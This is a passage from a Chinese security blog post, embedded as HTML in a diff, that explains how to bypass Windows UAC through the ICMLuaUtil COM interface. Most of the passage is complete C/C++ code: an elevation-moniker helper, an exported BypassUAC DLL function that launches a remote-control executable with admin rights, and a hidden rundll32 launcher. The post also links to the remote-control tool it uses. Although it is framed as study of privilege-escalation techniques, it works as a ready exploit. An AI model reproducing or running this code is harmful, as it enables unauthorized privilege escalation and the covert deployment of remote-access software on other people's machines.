+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method5</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method6</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">ShellExec</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>     <span class="n">LPCWSTR</span> <span class="n">lpFile</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span>  <span class="n">LPCTSTR</span> <span class="n">lpParameters</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span>  <span class="n">LPCTSTR</span> <span class="n">lpDirectory</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>      <span class="n">ULONG</span> <span class="n">fMask</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>      <span class="n">ULONG</span> <span class="n">nShow</span>
+</span></span><span class="line"><span class="cl">  <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">SetRegistryStringValue</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>      <span class="n">HKEY</span> <span class="n">hKey</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span>  <span class="n">LPCTSTR</span> <span class="n">lpSubKey</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span>  <span class="n">LPCTSTR</span> <span class="n">lpValueName</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>      <span class="n">LPCTSTR</span> <span class="n">lpValueString</span>
+</span></span><span class="line"><span class="cl">  <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method9</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method10</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method11</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method12</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method13</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method14</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method15</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method16</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method17</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method18</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method19</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span><span class="p">(</span><span class="n">STDMETHODCALLTYPE</span><span class="o">*</span> <span class="n">Method20</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__RPC__in</span> <span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">This</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">END_INTERFACE</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="o">*</span><span class="n">PICMLuaUtilVtbl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">interface</span> <span class="n">ICMLuaUtil</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="n">CONST_VTBL</span> <span class="k">struct</span> <span class="nc">ICMLuaUtilVtbl</span><span class="o">*</span> <span class="n">lpVtbl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="s">&#34;C&#34;</span> <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">CALLBACK</span> <span class="n">BypassUAC</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hWnd</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">LPSTR</span> <span class="n">lpszCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">iCmdShow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span> <span class="nf">CoCreateInstanceAsAdmin</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hWnd</span><span class="p">,</span> <span class="n">REFCLSID</span> <span class="n">rclsid</span><span class="p">,</span> <span class="n">REFIID</span> <span class="n">riid</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">ppVoid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">CMLuaUtilBypassUAC</span><span class="p">(</span><span class="n">LPWSTR</span> <span class="n">lpwszExecutable</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// File: CBypassUAC.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&#34;pch.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;CBypassUAC.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// COM提升名称，以管理员权限实例化一个组件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">HRESULT</span> <span class="nf">CoCreateInstanceAsAdmin</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hWnd</span><span class="p">,</span> <span class="n">REFCLSID</span> <span class="n">rclsid</span><span class="p">,</span> <span class="n">REFIID</span> <span class="n">riid</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">ppVoid</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="n">BIND_OPTS3</span> <span class="n">bo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">WCHAR</span> <span class="n">wszCLSID</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">WCHAR</span> <span class="n">wszMonikerName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span> <span class="n">hr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 初始化COM环境
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">::</span><span class="n">CoInitialize</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 构造字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">::</span><span class="n">StringFromGUID2</span><span class="p">(</span><span class="n">rclsid</span><span class="p">,</span> <span class="n">wszCLSID</span><span class="p">,</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">wszCLSID</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wszCLSID</span><span class="p">[</span><span class="mi">0</span><span class="p">])));</span>
+</span></span><span class="line"><span class="cl"><span class="n">hr</span> <span class="o">=</span> <span class="o">::</span><span class="n">StringCchPrintfW</span><span class="p">(</span><span class="n">wszMonikerName</span><span class="p">,</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">wszMonikerName</span><span class="p">)</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl">  <span class="k">sizeof</span><span class="p">(</span><span class="n">wszMonikerName</span><span class="p">[</span><span class="mi">0</span><span class="p">])),</span> <span class="sa">L</span><span class="s">&#34;Elevation:Administrator!new:%s&#34;</span><span class="p">,</span> <span class="n">wszCLSID</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">hr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 设置BIND_OPTS3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">::</span><span class="n">RtlZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bo</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bo</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">bo</span><span class="p">.</span><span class="n">cbStruct</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">bo</span><span class="p">.</span><span class="n">hwnd</span> <span class="o">=</span> <span class="n">hWnd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bo</span><span class="p">.</span><span class="n">dwClassContext</span> <span class="o">=</span> <span class="n">CLSCTX_LOCAL_SERVER</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 创建名称对象并获取COM对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">hr</span> <span class="o">=</span> <span class="o">::</span><span class="n">CoGetObject</span><span class="p">(</span><span class="n">wszMonikerName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bo</span><span class="p">,</span> <span class="n">riid</span><span class="p">,</span> <span class="n">ppVoid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">hr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">CMLuaUtilBypassUAC</span><span class="p">(</span><span class="n">LPWSTR</span> <span class="n">lpwszExecutable</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="n">HRESULT</span> <span class="n">hr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">CLSID</span> <span class="n">clsidICMLuaUtil</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">IID</span> <span class="n">iidICMLuaUtil</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">ICMLuaUtil</span><span class="o">*</span> <span class="n">CMLuaUtil</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">bRet</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="o">::</span><span class="n">CLSIDFromString</span><span class="p">(</span><span class="n">CLSID_CMSTPLUA</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clsidICMLuaUtil</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">::</span><span class="n">IIDFromString</span><span class="p">(</span><span class="n">IID_ICMLuaUtil</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iidICMLuaUtil</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// 提权
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">hr</span> <span class="o">=</span> <span class="n">CoCreateInstanceAsAdmin</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">clsidICMLuaUtil</span><span class="p">,</span> <span class="n">iidICMLuaUtil</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">CMLuaUtil</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// 启动程序
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">hr</span> <span class="o">=</span> <span class="n">CMLuaUtil</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">ShellExec</span><span class="p">(</span><span class="n">CMLuaUtil</span><span class="p">,</span> <span class="n">lpwszExecutable</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SW_SHOW</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">bRet</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">FALSE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 释放
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">CMLuaUtil</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">CMLuaUtil</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">CMLuaUtil</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">bRet</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span>  <span class="n">CALLBACK</span> <span class="nf">BypassUAC</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hWnd</span><span class="p">,</span> <span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span> <span class="n">LPSTR</span> <span class="n">lpszCmdLine</span><span class="p">,</span> <span class="kt">int</span> <span class="n">iCmdShow</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="n">CMLuaUtilBypassUAC</span><span class="p">((</span><span class="n">LPWSTR</span><span class="p">)</span><span class="sa">L</span><span class="s">&#34;F:</span><span class="se">\\</span><span class="s">RemoteCtrl_Win10.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这里需要注意，我们要在头文件中将目标函数<code>BypassUAC</code>导出，否则rundll32.exe程序无法正确获取这个函数。具体方法就是在函数声明时加上<code>extern &quot;C&quot; __declspec(dllexport)</code>前缀。</p>
+<p>对于DLL项目中的dllmain.cpp文件，保持默认即可。编译此程序，生成一个DLL。现在我们还需要编写一个程序用来调用rundll32.exe，使其执行链接库中的<code>BypassUAC</code>函数。</p>
+<p>新建一个Launcher项目，只有一个源文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// File: Launcher.cpp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//调用rundll32.exe去执行RemoteThreadDll.dll的导出函数 达到BypassUAC
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="n">szCmdLine</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">szRundll32Path</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">rundll32.exe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//获取当前程序所在路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="n">pszFileName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">GetModuleFileNameA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">pszFileName</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//获取当前程序所在目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">(</span><span class="n">strrchr</span><span class="p">(</span><span class="n">pszFileName</span><span class="p">,</span> <span class="sc">&#39;\\&#39;</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//拼接要注入dll路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="n">pszDllName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">sprintf_s</span><span class="p">(</span><span class="n">pszDllName</span><span class="p">,</span> <span class="s">&#34;%s</span><span class="se">\\</span><span class="s">%s&#34;</span><span class="p">,</span> <span class="n">pszFileName</span><span class="p">,</span> <span class="s">&#34;BypassUAC.dll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">sprintf_s</span><span class="p">(</span><span class="n">szCmdLine</span><span class="p">,</span> <span class="s">&#34;%s %s %s&#34;</span><span class="p">,</span> <span class="n">szRundll32Path</span><span class="p">,</span> <span class="n">pszDllName</span><span class="p">,</span> <span class="s">&#34;BypassUAC&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">WinExec</span><span class="p">(</span><span class="n">szCmdLine</span><span class="p">,</span> <span class="n">SW_HIDE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>运行此Launcher，将以管理员权限打开我们的远控程序。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 202; 
+			flex-basis: 486px"
+	>
+	<a href="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/bypassUAC.png" data-size="1422x702">
+		<img src="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/bypassUAC.png"
+			width="1422"
+			height="702"
+			srcset="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/bypassUAC_hufbd15da8cf50e726ab9722cba2e46860_102846_480x0_resize_box_3.png 480w, /p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/bypassUAC_hufbd15da8cf50e726ab9722cba2e46860_102846_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="管理员权限执行用户添加">
+	</a>
+	
+	<figcaption>管理员权限执行用户添加</figcaption>
+	
+</figure></p>
+<p>而没有提权时我们的程序无法执行这个指令。</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 202; 
+			flex-basis: 485px"
+	>
+	<a href="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/no_UAC.png" data-size="1460x721">
+		<img src="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/no_UAC.png"
+			width="1460"
+			height="721"
+			srcset="/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/no_UAC_huec842714bbafa68d87198d6c839cf4cf_87757_480x0_resize_box_3.png 480w, /p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/no_UAC_huec842714bbafa68d87198d6c839cf4cf_87757_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="正常权限下被拒绝访问">
+	</a>
+	
+	<figcaption>正常权限下被拒绝访问</figcaption>
+	
+</figure></p>
+</blockquote>
+</blockquote>
+<h4 id="参考文章">参考文章</h4>
+<p>[1] 酷扯儿.Windows编程技术：提权技术(下)[EB/OL].2020-09-22</p>
+<p><a class="link" href="https://baijiahao.baidu.com/s?id=1678518589760092233&amp;wfr=spider&amp;for=pc"  target="_blank" rel="noopener"
+    >https://baijiahao.baidu.com/s?id=1678518589760092233&wfr=spider&for=pc</a></p>
+<p>[2] FDCFDMin.COM（Componet Object Model_组件对象模型）技术概述[EB/OL].2018-09-17</p>
+<p><a class="link" href="https://blog.csdn.net/weixin_39743893/article/details/82500563"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/weixin_39743893/article/details/82500563</a></p>
+<p>[3] Microsoft.COM Technical Overview[EB/OL].2018-05-31</p>
+<p><a class="link" href="https://docs.microsoft.com/zh-cn/windows/win32/com/com-technical-overview"  target="_blank" rel="noopener"
+    >https://docs.microsoft.com/zh-cn/windows/win32/com/com-technical-overview</a></p>
+<p>[4] 自己的小白.基于COM组件接口ICMLuaUtil的Bypass UAC[EB/OL].2020-04-24</p>
+<p><a class="link" href="https://www.cnblogs.com/ndyxb/p/12770289.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/ndyxb/p/12770289.html</a></p>
+<h4 id="本文中使用的远控程序">本文中使用的远控程序</h4>
+<p><a class="link" href="https://github.com/SGS4ever/RemoteCtrl"  target="_blank" rel="noopener"
+    >https://github.com/SGS4ever/RemoteCtrl</a></p>
+
+</section>
+
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+        
+    </section>
+
+
+    </footer>
+
+
+
+    
+</article>
+
+    
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/owasp-top102021/">
+        
+        
+
+        <div class="article-image">
+            
+            <img src="/img/related-content.png" loading="lazy" 
+            data-key="" data-hash="" 
+            style="opacity: 0.3;"/>
+        </div>
+        <div class="article-details">
+            <h2 class="article-title">OWASP Top10（2021）</h2>
+            <footer class="article-time">
+                <time datetime=''>Sep 29, 2021</time>
+            </footer>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/audit-%E7%AE%80%E8%BF%B0/">
+        
+        
+
+        <div class="article-image">
+            
+            <img src="/img/related-content.png" loading="lazy" 
+            data-key="" data-hash="" 
+            style="opacity: 0.3;"/>
+        </div>
+        <div class="article-details">
+            <h2 class="article-title">audit 简述</h2>
+            <footer class="article-time">
+                <time datetime=''>Aug 25, 2021</time>
+            </footer>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
